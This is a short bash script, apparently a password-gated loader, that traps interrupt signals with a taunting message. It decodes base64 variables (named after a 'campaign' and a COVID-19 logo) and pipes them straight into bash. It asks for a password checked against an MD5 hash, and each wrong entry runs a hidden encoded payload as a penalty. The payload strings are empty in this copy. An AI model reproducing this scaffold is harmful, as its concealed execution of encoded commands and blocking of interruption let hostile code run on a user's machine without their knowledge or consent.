#!/bin/bash

trap echo "Put it in your mouth! Mit Sack? Mit Sack!!!!" SIGINT SIGTERM SIGHUP
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export FALSE_PASSWD=''
export COVID19_LOGO=''
export CAMPAIGNLOGO=''
PASSWORD_WRONG=1
export PWDHASH="1cdbb732b5fb20c3c26971f758f83cdd"

clear ; echo '' ; echo '' ; echo $CAMPAIGNLOGO | base64 -d | bash ; clear
echo '' ; echo '' ; echo $COVID19_LOGO | base64 -d | bash ; sleep 9

function ASKAPASS(){
clear
while [ $PASSWORD_WRONG -eq 1 ]
 do
	echo '' ; echo ''
    echo "Password:"
    read -s ENTERED_PASSWORD
    PWDINPUTHASH=`echo $ENTERED_PASSWORD | md5sum | awk '{print $1}'`

if [[ "$PWDINPUTHASH" = *"$PWDHASH"* ]];then
echo "Access Granted"
PASSWORD_WRONG=0
else
echo -e "\e[1;33;41m Access Deniend: Incorrenct password!. Try again \033[0m";
sleep 3
echo $FALSE_PASSWD | base64 -d | bash
fi
done
}
ASKAPASS

exit

